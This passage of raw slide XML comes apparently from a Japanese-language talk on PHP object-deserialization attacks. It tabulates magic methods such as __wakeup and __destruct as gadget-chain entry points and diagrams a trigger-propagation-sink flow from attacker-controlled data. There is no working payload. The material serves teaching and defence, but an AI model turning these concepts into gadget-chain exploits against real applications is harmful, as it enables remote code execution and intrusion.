                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>シリアライズ前処理。攻撃起点にはならない</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305891">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="E08A3C"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>__wakeup</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>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540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>unserialize($s)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="4889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540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>デシリアライズ直後に自動実行 — 最重要の起点</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="4889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5891">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="E08A3C"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>__destruct</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="C5C4C1"/>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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>オブジェクト破棄時</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>ガジェットチェーンで多用される起点（Laravel RCE系列など）</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305891">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="E08A3C"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>__toString</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>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540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>echo $obj</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="4889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540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>文字列化時に実行 — チェーンの終端として使われる例あり</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="4889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5891">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="E08A3C"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>__get / __call</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="C5C4C1"/>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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>存在しないプロパティ/メソッドへのアクセス</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1540"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1100" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>SQLi等、別クラスへの連鎖（ガジェット）を作る定番</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="48895" marR="48895" marT="48895" marB="48895"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="3766840"/>
            <a:ext cx="10883392" cy="212030"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A7179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PHP7.4+では __unserialize / __serialize が __wakeup / __sleep より優先される（PHPのみに存在する概念：仕様差に注意）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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4171A"/>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48866"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3335"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Trigger → Propagation → Sink</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2324100" y="1543050"/>
            <a:ext cx="1270000" cy="571500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2502595" y="2178050"/>
            <a:ext cx="913011" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>攻撃者制御</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>シリアライズデータ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 1" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3784600" y="2000250"/>
            <a:ext cx="355600" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Image 2" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4330700" y="1543050"/>
            <a:ext cx="1270000" cy="571500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4259759" y="2178050"/>
            <a:ext cx="1411883" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>TRIGGER</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>__wakeup / __destruct</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Image 3" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5791200" y="2000250"/>
            <a:ext cx="355600" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 4" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6273800" y="1543050"/>
            <a:ext cx="1651000" cy="571500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6269732" y="2178050"/>
            <a:ext cx="1659136" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PROPAGATION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>既存クラス（ガジェット）を連鎖</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Image 5" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
